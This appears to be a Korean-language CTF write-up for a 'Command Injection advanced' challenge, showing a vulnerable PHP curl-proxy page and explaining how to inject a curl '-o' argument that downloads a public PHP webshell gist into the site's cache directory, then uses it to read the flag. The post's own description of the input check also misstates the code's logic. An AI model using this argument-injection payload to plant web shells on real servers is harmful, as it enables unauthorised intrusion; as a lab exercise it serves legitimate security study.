---
title: "[2025-07-26] Command Injection advanced"
excerpt: "Command Injection"

categories:
  - Problem
tags:
  - [Command Injection]

permalink: /Problem/[2025-07-26] Command Injection advanced/

toc: true
toc_sticky: true

date: 2025-07-26
last_modified_at: 2025-07-26
---

## 🦥 본문

- index.php

```python
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
    <?php
        if(isset($_GET['url'])){
            $url = $_GET['url'];
            if(strpos($url, 'http') !== 0 ){
                die('http only !');
            }else{
                $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
                $cache_file = './cache/'.md5($url);
                file_put_contents($cache_file, $result);
                echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
                echo '<pre>'. htmlentities($result) .'</pre>';
                return;
            }
        }else{
        ?>
            <form>
                <div class="field">
                    <label class="label">URL</label>
                    <input class="input" type="text" placeholder="url" name="url" required>
                </div>
                <div class="control">
                    <input class="button is-success" type="submit" value="submit">
                </div>
            </form>
        <?php
        }
    ?>
        </div>
        </div>
    </body>
</html>
```

$_GET[’url’]을 통해 url을 받는 데, http로 시작하면 die()를 실행한다. 

escpaeshellcmd를 통해 인젝션을 보호하고 curl 을 통해 셸 명령어를 실행시킨다. 해당 url은 cache 디렉토리 및에 해싱하여 저장한다. 

### 풀이

`-o` 인자를 통해 웹셸 파일을 업로드하여 실행해야 FLAG 파일을 알 수 있다.

1. 웹쉘 코드가 포함된 서버를 만듦
2. 해당 웹쉘 코드를 방문하고 -o 인자를 통해 실행 결과를 저장
3. 해당 파일에 접근하여 flag 를 알아낼 수 있다.

위와 같은 방법은 서버가 있어야 해서 다른 방법 Github raw file 링크를 이용한 방법이 있다.

github raw file 링크는 응답 body에 해당 코드를 보내줘서 해당 코드를 볼 수 있는 파일이다.

1. 웹쉘 코드를 응답 바디로 보내는 gitraw file 링크

```python
https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php
```

1. 해당 링크에다 아래의 코드를 추가하여 webshell.php 파일을 만든다

```python
-o /var/www/html/cache/webshell.php
```

1. cache/webshell.php에 접속하여 웹쉘 코드에 `/flag` 에 접근하여 flag를 획득한다.